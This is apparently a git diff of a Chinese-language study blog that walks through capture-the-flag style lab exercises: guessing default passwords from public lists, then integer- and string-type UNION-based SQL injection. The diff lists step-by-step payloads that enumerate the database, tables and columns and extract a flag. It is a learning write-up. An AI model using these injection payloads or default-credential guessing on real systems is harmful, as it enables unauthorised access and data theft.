@@ -251,11 +251,92 @@ pin: true
        
          
        
-  - ##### 默认口令
+  - #### 默认口令
        
     这道题目也是很不错，虽然有验证码，并且验证码竟然是没有过期的，哎，我尝试了一下重放攻击，发现验证码是不能多次使用，所以放弃，直接上网找默认口令，[棱角社区](https://forum.ywhack.com/password.php)，[Common-device-default-password](https://github.com/NepoloHebo/Common-device-default-password)
   
     ![image-20241117221649167](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241117221649167.png)
   
     然后就一个个试，幸好不多，就是出来啦，ps:棱角社区的帐号密码有点错误
-           
+    
+### 5. SQL注入
+  
+  - #### 整数型注入
+  
+    在学习sql注入之前，得先具备数据库的基本知识，不过我感觉我之前学习的全都忘记了，只记得一些比较简单的sql语句，所以我先学了一下基本的语句以及sql注入经常会遇到的**[information_schema库](https://yuririns.github.io/2019/03/30/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0-information_schema%E5%BA%93/)**，让我们开始做题吧
+  
+    ![image-20241118232819863](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241118232819863.png)
+  
+    当输入以下命令，发现没有显示，而输入order by 1 /2 就会有显示，可以判断这个表可能就只有两个字段，判断这个的原因主要是我们肯定是要union其他表，这里有个规定，union的表必须和当前这个表的字段相同。
+  
+    ```sql
+    1 or 1=1 order by 3
+    ```
+  
+    ![image-20241118233200893](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241118233200893.png)
+  
+    接下来就是爆数据库的名称，输入
+  
+    ```sql
+    1 and 1=2 union select database(),2
+    ```
+  
+    ![image-20241119085417348](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119085417348.png)
+  
+    为什么要用 `id=1 and 1=2`，这是因为只有where后面的语句不成立，才能够输出union后面的内容，`database()`其实就是数据库的名称，为了后面用information_shcema库来爆表和字段做铺垫，这样子我们就可以知道库名叫做`sqli`。有些关于union的解释可以[参考](https://blog.csdn.net/m0_51756263/article/details/125700087)
+    
+    键入以下sql语句，information_schema是数据库的元数据，他其实一个视图，只能查看，不能修改，具体可以[参考](https://yuririns.github.io/2019/03/30/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0-information_schema%E5%BA%93/)，下面就是爆表了，查看数据库`sqli`中有多少张表
+    
+    ```sql
+    1 and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'
+    ```
+    ![image-20241119090915454](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119091353651.png)
+  
+    爆表后就是爆字段，发现flag表后还有flag字段
+    
+    ```sql
+    1 and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name='flag'
+    ```
+    ![image-20241119091425489](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119091425489.png)
+    
+    ```sql
+    id=1 and 1=2 union select flag,2 from flag
+    ```
+  - #### 字符型注入
+    
+    先输入一个1看看，发现现在用的是字符型，那么就需要用到#以及'来进行注释和封闭
+    
+    ![image-20241119093018281](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119093018281.png)
+    
+    爆库
+    
+    ```sql
+    1' and 1=2 union select database(),2#
+    ```
+    
+    ![image-20241119093247111](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119093247111.png)
+    
+    爆表
+    
+    ```sql
+    1' and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'#
+    ```
+    
+    ![image-20241119093610451](../../../../../../Users/guoweibin/Library/Application%20Support/typora-user-images/image-20241119093610451.png)
+    
+    爆字段
+    
+    ```sql
+    1' and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#
+    ```
+    
+    ![image-20241119093854717](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119093854717.png)
+    
+    查数据
+    
+    ```sql
+    1' and 1=2 union select flag,2 from flag#
+    ```
+    
+    ![image-20241119094030945](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119094030945.png)
+    
